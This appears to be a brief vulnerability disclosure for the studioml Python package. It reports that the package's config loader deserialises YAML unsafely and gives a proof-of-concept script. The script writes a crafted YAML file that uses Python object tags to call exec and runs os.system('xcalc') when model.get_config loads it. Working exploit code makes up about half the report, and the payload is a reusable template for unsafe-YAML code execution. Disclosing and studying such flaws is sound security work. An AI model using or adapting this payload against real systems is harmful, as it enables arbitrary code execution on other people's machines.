# Description

`studioml` is simplify and expedite model building process which is vulnerable to `Arbitrary Code Execution`.

# Vulnerability

Vulnerable to YAML deserialization attack caused by unsafe loading.

# Proof of Concept

### Installation
```bash
pip install studioml
```

### Run exploit.py
```
import os
#os.system('pip3 install studioml')
from studio import model
exploit = """!!python/object/new:type
  args: ["z", !!python/tuple [], {"extend": !!python/name:exec }]
  listitems: "__import__('os').system('xcalc')"
"""
open('pwn.yml','w+').write(exploit)
model.get_config('pwn.yml')
```
* `python3 exploit.py`

# Impact

Arbitary Code Execution
